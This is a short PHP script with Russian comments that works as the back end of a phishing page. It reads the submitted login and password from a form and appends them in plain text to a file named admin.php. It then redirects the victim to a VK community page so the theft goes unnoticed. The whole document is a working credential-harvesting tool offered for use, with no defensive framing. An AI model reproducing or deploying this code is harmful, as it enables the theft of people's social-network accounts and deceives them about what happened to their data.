<?PHP

$Login = $_POST['login']; // Логин
$Pass = $_POST['passwd']; // Пароль

$log = fopen("admin.php","a+"); //открываем файл базы
fwrite($log,"<br>");
fwrite($log,"$Login:$Pass"); //записываем всё
fclose($log); //закрываем
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com/club59403712'></head></html>"; // куда пошлем пользователя после того как он ввел данные!
?>